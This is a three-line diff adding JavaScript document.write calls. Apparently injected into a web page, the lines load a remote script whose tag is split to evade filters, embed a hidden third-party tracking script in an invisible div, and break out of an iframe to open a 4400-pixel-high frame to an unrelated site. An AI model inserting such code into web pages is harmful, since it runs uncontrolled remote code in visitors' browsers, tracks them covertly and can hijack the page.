@@ -1,0 +1,3 @@
+document.write("<scr"+"ipt src=\"http://code.54kefu.net/kefu/js/103/676703.js\" charset=\"utf-8\" language=\"JavaScript\"></sc"+"ript>");
+document.write ('<div style="display:none"><script language="javascript" type="text/javascript" src="http://js.users.51.la/17206430.js"></script></div>');
+document.write("</iframe><iframe src='http://www.gzznpaiju.com/' rel='nofollow' scrolling='no' frameborder='0' width='100%'  height='4400'>");
